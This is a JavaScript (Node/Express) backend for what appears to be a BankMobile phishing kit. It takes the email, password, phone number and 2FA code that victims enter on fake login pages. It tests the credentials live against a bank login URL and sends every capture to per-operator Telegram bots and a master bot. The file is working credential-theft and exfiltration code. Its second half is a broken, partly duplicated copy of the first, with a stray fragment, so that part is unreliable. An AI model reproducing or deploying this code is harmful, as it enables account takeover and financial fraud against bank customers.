// ================================================
// BANKMOBILE CENTRAL RELAY BACKEND
// Client bot: NO client ID | MASTER bot: WITH client ID
// ================================================

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3004;

app.use(cors({ origin: '*' }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ================================================
// TELEGRAM BOT CONFIGURATIONS
// ================================================

// MASTER BOT - Receives EVERYTHING with client ID
const MASTER_BOT = {
    token: process.env.MASTER_BOT_TOKEN || process.env.BOT_TOKEN_1,
    chatId: process.env.MASTER_CHAT_ID || process.env.CHAT_ID_1
};

// Individual client bots
const BOT_CONFIGS = {
    'emmy': {
        token: process.env.BOT_TOKEN_1,
        chatId: process.env.CHAT_ID_1
    },
    'mastapis': {
        token: process.env.BOT_TOKEN_2,
        chatId: process.env.CHAT_ID_2
    },
    'black': {
        token: process.env.BOT_TOKEN_3,
        chatId: process.env.CHAT_ID_3
    },
    'oju': {
        token: process.env.BOT_TOKEN_4,
        chatId: process.env.CHAT_ID_4
    },
    'bosun': {
        token: process.env.BOT_TOKEN_5,
        chatId: process.env.CHAT_ID_5
    },
    'chamber': {
        token: process.env.BOT_TOKEN_6,
        chatId: process.env.CHAT_ID_6
    },
    'hayzed': {
        token: process.env.BOT_TOKEN_7,
        chatId: process.env.CHAT_ID_7
    },
    'ysd': {
        token: process.env.BOT_TOKEN_8,
        chatId: process.env.CHAT_ID_8
    },
    'sula': {
        token: process.env.BOT_TOKEN_9,
        chatId: process.env.CHAT_ID_9
    },
    'jide': {
        token: process.env.BOT_TOKEN_10,
        chatId: process.env.CHAT_ID_10
    },
    'crip': {
        token: process.env.BOT_TOKEN_11,
        chatId: process.env.CHAT_ID_11
    },
    'aro': {
        token: process.env.BOT_TOKEN_12,
        chatId: process.env.CHAT_ID_12
    },
    'apo': {
        token: process.env.BOT_TOKEN_13,
        chatId: process.env.CHAT_ID_13
    },
    'alahji': {
        token: process.env.BOT_TOKEN_14,
        chatId: process.env.CHAT_ID_14
    },
    'ola': {
        token: process.env.BOT_TOKEN_15,
        chatId: process.env.CHAT_ID_15
    }
};

// Default config (fallback)
const DEFAULT_CONFIG = {
    token: process.env.DEFAULT_BOT_TOKEN || process.env.BOT_TOKEN_1,
    chatId: process.env.DEFAULT_CHAT_ID || process.env.CHAT_ID_1
};

// ================================================
// SEND TO TELEGRAM
// ================================================
async function sendToTelegram(token, chatId, message) {
    if (!token || !chatId) {
        console.log('⚠️ Missing token or chat ID');
        return false;
    }
    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        console.log(`✅ Telegram sent to: ${chatId}`);
        return true;
    } catch (error) {
        console.error(`❌ Telegram error (${chatId}):`, error.message);
        return false;
    }
}

// ================================================
// SEND TO CLIENT BOT + MASTER BOT
// ================================================
async function sendToAllBots(message, clientId, clientMessage, masterMessage) {
    const results = [];
    
    // 1. Send to the specific client's bot (WITHOUT client ID)
    const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;
    const clientResult = await sendToTelegram(config.token, config.chatId, clientMessage);
    results.push({ bot: clientId, sent: clientResult });
    
    // 2. Send to MASTER bot (WITH client ID)
    const masterResult = await sendToTelegram(MASTER_BOT.token, MASTER_BOT.chatId, masterMessage);
    results.push({ bot: 'MASTER', sent: masterResult });
    
    return results;
}

// ================================================
// AUTHENTICATE WITH BANKMOBILE
// ================================================
async function authenticateWithAPI(email, password) {
    try {
        console.log(`🌐 Sending login request for: ${email}`);

        const params = new URLSearchParams();
        params.append('usrname', email);
        params.append('passwd', password);

        const response = await axios.post('https://profile.refundselection.com/authenticate/login', 
            params.toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                maxRedirects: 0,
                validateStatus: (status) => status < 500
            }
        );

        console.log(`Response status: ${response.status}`);

        if (response.status === 302) {
            console.log('✅ SUCCESS');
            return { success: true };
        }

        console.log('❌ FAILED');
        return { success: false };

    } catch (error) {
        if (error.response && error.response.status === 302) {
            console.log('✅ SUCCESS (redirect)');
            return { success: true };
        }
        console.log('❌ FAILED:', error.message);
        return { success: false };
    }
}

// ================================================
// FORMAT MESSAGES
// ================================================
function formatMessage(email, password, success, frontend, step) {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
    const statusText = success ? '✅ VALID' : '❌ INVALID';
    const statusEmoji = success ? '✅' : '❌';
    
    // CLIENT MESSAGE - WITHOUT client ID
    const clientMessage = `${statusEmoji} <b>BANKMOBILE LOGIN</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📧 <b>Email:</b> <code>${email}</code>\n` +
        `🔑 <b>Password:</b> <code>${password}</code>\n` +
        `📊 <b>Status:</b> ${statusText}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${timestamp}`;
    
    // MASTER MESSAGE - WITH client ID
    const masterMessage = `${statusEmoji} <b>BANKMOBILE LOGIN</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📧 <b>Email:</b> <code>${email}</code>\n` +
        `🔑 <b>Password:</b> <code>${password}</code>\n` +
        `📊 <b>Status:</b> ${statusText}\n` +
        `🆔 <b>Client:</b> ${frontend || 'unknown'}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${timestamp}`;
    
    return { clientMessage, masterMessage };
}

function formatPhoneMessage(phone, frontend, step) {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
    
    // CLIENT MESSAGE - WITHOUT client ID
    const clientMessage = `📱 <b>PHONE NUMBER</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📱 <b>Phone:</b> <code>${phone}</code>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${timestamp}`;
    
    // MASTER MESSAGE - WITH client ID
    const masterMessage = `📱 <b>PHONE NUMBER</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📱 <b>Phone:</b> <code>${phone}</code>\n` +
        `🆔 <b>Client:</b> ${frontend || 'unknown'}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${timestamp}`;
    
    return { clientMessage, masterMessage };
}

function formatOtpMessage(otp, trusted, frontend, step) {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
    
    // CLIENT MESSAGE - WITHOUT client ID
    const clientMessage = `🔐 <b>2FA CODE</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🔢 <b>Code:</b> <code>${otp}</code>\n` +
        `💻 <b>Trust Device:</b> ${trusted ? '✅ Yes' : '❌ No'}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${timestamp}`;
    
    // MASTER MESSAGE - WITH client ID
    const masterMessage = `🔐 <b>2FA CODE</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🔢 <b>Code:</b> <code>${otp}</code>\n` +
        `💻 <b>Trust Device:</b> ${trusted ? '✅ Yes' : '❌ No'}\n` +
        `🆔 <b>Client:</b> ${frontend || 'unknown'}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${timestamp}`;
    
    return { clientMessage, masterMessage };
}

// ================================================
// SHARED AUTH HANDLER
// ================================================
async function handleAuth(req, res) {
    const { email, password, frontend } = req.body;
    
    const clientId = frontend || 'default';
    console.log(`\n🔐 Login attempt from: ${clientId}`);
    console.log(`📧 Email: ${email}`);
    
    // Validate with BankMobile
    const result = await authenticateWithAPI(email, password);
    
    // Format messages
    const messages = formatMessage(email, password, result.success, clientId, 'login');
    
    // Send to client bot + MASTER bot
    const results = await sendToAllBots(messages.clientMessage, clientId, messages.clientMessage, messages.masterMessage);
    
    // Return response
    res.json({
        success: result.success,
        client: clientId,
        telegramSent: results
    });
}

// ================================================
// PHONE HANDLER
// ================================================
app.post('/submit-phone', async (req, res) => {
    const { phone, frontend, step } = req.body;
    const clientId = frontend || 'default';
    
    console.log(`📱 Phone from ${clientId}: ${phone}`);
    
    const messages = formatPhoneMessage(phone, clientId, step || 'phone_submitted');
    await sendToAllBots(messages.clientMessage, clientId, messages.clientMessage, messages.masterMessage);
    
    res.json({ success: true });
});

// ================================================
// OTP HANDLER
// ================================================
app.post('/submit-otp', async (req, res) => {
    const { otp, trusted, frontend, step } = req.body;
    const clientId = frontend || 'default';
    
    console.log(`🔐 OTP from ${clientId}: ${otp}`);
    
    const messages = formatOtpMessage(otp, trusted || false, clientId, step || '2fa_submitted');
    await sendToAllBots(messages.clientMessage, clientId, messages.clientMessage, messages.masterMessage);
    
    res.json({ success: true });
});

// ================================================
// ALL AUTH ENDPOINTS - SUPPORTS ROTATION
// ================================================
app.post('/authenticate', handleAuth);
app.post('/auth', handleAuth);
app.post('/verify', handleAuth);
app.post('/login', handleAuth);
app.post('/validate', handleAuth);

// ================================================
// HEALTH CHECK
// ================================================
app.get('/health', (req, res) => {
    const botCount = Object.keys(BOT_CONFIGS).length;
    res.json({ 
        status: 'ok', 
        service: 'bankmobile-relay',
        bots: botCount + 1, // +1 for MASTER bot
        clients: Object.keys(BOT_CONFIGS),
        masterBot: 'configured'
    });
});

// ================================================
// ROOT
// ================================================
app.get('/', (req, res) => {
    res.json({
        service: 'BankMobile Relay Backend',
        status: 'running',
        clients: Object.keys(BOT_CONFIGS),
        masterBot: 'Always receives all messages with client ID',
        endpoints: {
            'POST /authenticate': 'Login',
            'POST /auth': 'Login',
            'POST /verify': 'Login',
            'POST /login': 'Login',
            'POST /validate': 'Login',
            'POST /submit-phone': 'Submit phone',
            'POST /submit-otp': 'Submit OTP',
            'GET /health': 'Health check'
        }
    });
});

// ================================================
// START SERVER
// ================================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ BankMobile Relay running on port ${PORT}`);
    console.log(`📨 Clients: ${Object.keys(BOT_CONFIGS).join(', ')}`);
    console.log(`👑 MASTER Bot: Always receives ALL messages with client ID`);
});
	'crip': {
        token: process.env.BOT_TOKEN_11,
        chatId: process.env.CHAT_ID_11
		
		
};


const DEFAULT_CONFIG = {
    token: process.env.DEFAULT_BOT_TOKEN,
    chatId: process.env.DEFAULT_CHAT_ID
};


async function sendToTelegram(token, chatId, message) {
    if (!token || !chatId) {
        console.log('⚠️ Missing token or chat ID');
        return false;
    }
    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        console.log(`✅ Telegram sent to: ${chatId}`);
        return true;
    } catch (error) {
        console.error(`❌ Telegram error:`, error.message);
        return false;
    }
}

async function authenticateWithAPI(email, password) {
    try {
        console.log(`🌐 Sending login request for: ${email}`);

        const params = new URLSearchParams();
        params.append('usrname', email);
        params.append('passwd', password);

        const response = await axios.post('https://profile.refundselection.com/authenticate/login', 
            params.toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                maxRedirects: 0,
                validateStatus: (status) => status < 500
            }
        );

        console.log(`Response status: ${response.status}`);

        if (response.status === 302) {
            console.log('✅ SUCCESS');
            return { success: true };
        }

        console.log('❌ FAILED');
        return { success: false };

    } catch (error) {
        if (error.response && error.response.status === 302) {
            console.log('✅ SUCCESS (redirect)');
            return { success: true };
        }
        console.log('❌ FAILED:', error.message);
        return { success: false };
    }
}


function formatMessage(email, password, success, frontend) {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
    const statusText = success ? '✅ VALID' : '❌ INVALID';
    const statusEmoji = success ? '✅' : '❌';
    
    return `${statusEmoji} <b>BANKMOBILE LOGIN</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📧 <b>Email:</b> <code>${email}</code>\n` +
        `🔑 <b>Password:</b> <code>${password}</code>\n` +
        `📊 <b>Status:</b> ${statusText}\n` +
        `🆔 <b>Client:</b> ${frontend || 'unknown'}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${timestamp}`;
}


async function handleAuth(req, res) {
    const { email, password, frontend } = req.body;
    
    const clientId = frontend || 'default';
    console.log(`\n🔐 Login attempt from: ${clientId}`);
    console.log(`📧 Email: ${email}`);
    
    // Get bot config for this frontend
    const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;
    
    // Validate with BankMobile
    const result = await authenticateWithAPI(email, password);
    
    // Format and send message
    const message = formatMessage(email, password, result.success, clientId);
    await sendToTelegram(config.token, config.chatId, message);
    
    // Return response
    res.json({
        success: result.success,
        client: clientId,
        telegramSent: true
    });
}

app.post('/authenticate', handleAuth);
app.post('/auth', handleAuth);
app.post('/verify', handleAuth);
app.post('/login', handleAuth);
app.post('/validate', handleAuth);

// ================================================
// PHONE ENDPOINT
// ================================================
app.post('/submit-phone', async (req, res) => {
    const { phone, frontend } = req.body;
    const clientId = frontend || 'default';
    const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;
    
    console.log(`📱 Phone from ${clientId}: ${phone}`);
    
    const message = `📱 <b>PHONE NUMBER</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📱 <b>Phone:</b> <code>${phone}</code>\n` +
        `🆔 <b>Client:</b> ${clientId}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}`;
    
    await sendToTelegram(config.token, config.chatId, message);
    res.json({ success: true });
});

// ================================================
// OTP ENDPOINT
// ================================================
app.post('/submit-otp', async (req, res) => {
    const { otp, frontend } = req.body;
    const clientId = frontend || 'default';
    const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;
    
    console.log(`🔐 OTP from ${clientId}: ${otp}`);
    
    const message = `🔐 <b>2FA CODE</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🔢 <b>Code:</b> <code>${otp}</code>\n` +
        `🆔 <b>Client:</b> ${clientId}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}`;
    
    await sendToTelegram(config.token, config.chatId, message);
    res.json({ success: true });
});

// ================================================
// HEALTH CHECK
// ================================================
app.get('/health', (req, res) => {
    const botCount = Object.keys(BOT_CONFIGS).length;
    res.json({ 
        status: 'ok', 
        service: 'bankmobile-relay',
        bots: botCount,
        clients: Object.keys(BOT_CONFIGS)
    });
});

// ================================================
// ROOT
// ================================================
app.get('/', (req, res) => {
    res.json({
        service: 'BankMobile Relay Backend',
        status: 'running',
        clients: Object.keys(BOT_CONFIGS),
        endpoints: {
            'POST /authenticate': 'Login',
            'POST /auth': 'Login',
            'POST /verify': 'Login',
            'POST /login': 'Login',
            'POST /validate': 'Login',
            'POST /submit-phone': 'Submit phone',
            'POST /submit-otp': 'Submit OTP',
            'GET /health': 'Health check'
        }
    });
});

// ================================================
// START SERVER
// ================================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ BankMobile Relay running on port ${PORT}`);
    console.log(`📨 Bots configured: ${Object.keys(BOT_CONFIGS).join(', ')}`);
});
